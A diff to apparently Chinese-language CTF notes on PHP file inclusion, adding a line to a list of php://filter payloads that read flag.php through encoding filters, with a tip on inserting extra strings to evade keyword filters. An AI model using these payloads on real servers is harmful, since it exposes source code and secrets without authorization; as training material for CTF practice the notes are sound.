@@ -18,10 +18,12 @@ include php://filter/read=convert.base64-encode/resource=flag.php
 
 也可中间加个index等字符也可以，绕过一些包含字符匹配。
 php://filter/read=convert.base64-encode/index/resource=flag
+php://filter/ctfshow/resource=flag.php
 ```
 其他编码方式
 ```
 file=php://filter/resource=flag.php
+php://filter/ctfshow/resource=flag.php
 file=php://filter/read=convert.quoted-printable-encode/resource=/var/www/html/flag.php
 
 
